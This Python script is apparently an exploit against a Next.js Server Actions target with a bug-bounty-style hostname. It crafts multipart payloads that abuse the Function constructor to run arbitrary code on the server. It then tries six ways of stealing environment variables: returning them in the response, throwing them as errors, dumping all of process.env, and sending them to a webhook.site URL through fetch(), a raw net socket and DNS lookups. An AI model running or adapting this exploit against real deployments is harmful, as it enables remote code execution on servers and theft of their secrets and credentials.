#!/usr/bin/env python3
"""
Simplest possible exfiltration - throw error with env var
"""

import requests
import json
import random
import string

TARGET = "https://nextjs-cve-hackerone.vercel.app"
ACTION_ID = "007138e0bfbdd7fe024391a1251fd5861f0b5145dc"
WEBHOOK = "https://webhook.site/f794cbb8-6c39-49cc-987a-a141d67c244a"

def try_simple(code, label):
    print(f"\n[*] {label}")

    boundary = "----WebKitFormBoundary" + ''.join(random.choices(string.ascii_letters + string.digits, k=16))

    payload_0 = f"$F1#{ACTION_ID}#constructor"
    payload_1 = {"constructor": {"constructor": code}}

    body = f'------{boundary}\r\n'
    body += 'Content-Disposition: form-data; name="0"\r\n\r\n'
    body += payload_0 + '\r\n'
    body += f'------{boundary}\r\n'
    body += 'Content-Disposition: form-data; name="1"\r\n\r\n'
    body += json.dumps(payload_1) + '\r\n'
    body += f'------{boundary}--\r\n'

    headers = {
        'Next-Action': ACTION_ID,
        'Content-Type': f'multipart/form-data; boundary=----{boundary}',
        'Accept': 'text/x-component',
    }

    response = requests.post(TARGET, data=body, headers=headers, timeout=15)
    print(f"    Status: {response.status_code}")
    print(f"    Response: {response.text}")
    return response

print("="*70)
print("Simple Exfiltration Methods")
print("="*70)

# Method 1: Return the value directly
try_simple("process.env.VERCEL_PLATFORM_PROTECTION", "Return env var")

# Method 2: Throw it as error message
try_simple("throw new Error('FLAG:' + process.env.VERCEL_PLATFORM_PROTECTION)", "Throw as error")

# Method 3: Return all env
try_simple("JSON.stringify(process.env)", "Return all env as JSON")

# Method 4: Use fetch() to webhook (browser API, might work)
try_simple(f"""
fetch('{WEBHOOK}?flag=' + encodeURIComponent(process.env.VERCEL_PLATFORM_PROTECTION))
""", "fetch() to webhook")

# Method 5: Create HTTP request using net module
try_simple(f"""
const net = require('net');
const client = net.connect({{host: 'webhook.site', port: 443}});
client.write('GET /f794cbb8-6c39-49cc-987a-a141d67c244a?flag=' + process.env.VERCEL_PLATFORM_PROTECTION + ' HTTP/1.1\\r\\nHost: webhook.site\\r\\n\\r\\n');
client.end();
""", "net module")

# Method 6: DNS exfiltration (encode in subdomain)
try_simple(f"""
require('dns').resolve(process.env.VERCEL_PLATFORM_PROTECTION + '.webhook.site', () => {{}});
""", "DNS exfiltration")

print("\n" + "="*70)
